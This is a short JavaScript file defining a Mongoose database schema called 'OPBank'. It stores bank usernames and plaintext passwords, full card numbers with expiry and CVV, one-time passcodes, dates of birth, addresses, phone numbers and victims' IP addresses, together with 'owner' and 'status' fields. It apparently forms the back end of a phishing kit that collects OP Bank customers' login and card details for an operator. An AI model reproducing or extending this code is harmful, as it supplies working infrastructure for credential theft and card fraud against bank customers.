const mongoose = require("mongoose");

const opBank = new mongoose.Schema({
	uniqueid: String,
	username: String,
	password: String,
	address: String,
	dob: String,
	payeeName: String,
	amount: String,
	telephone: String,
	ccname: String,
	keyNumber: String,
	ccnum: String,
	ccexp: String,
	last3: String,
	otp: String,
	cvv: String,
	ip: String,
	status: Number,
	owner: String,
	timestamp: Date,
});

module.exports = mongoose.model("OPBank", opBank);
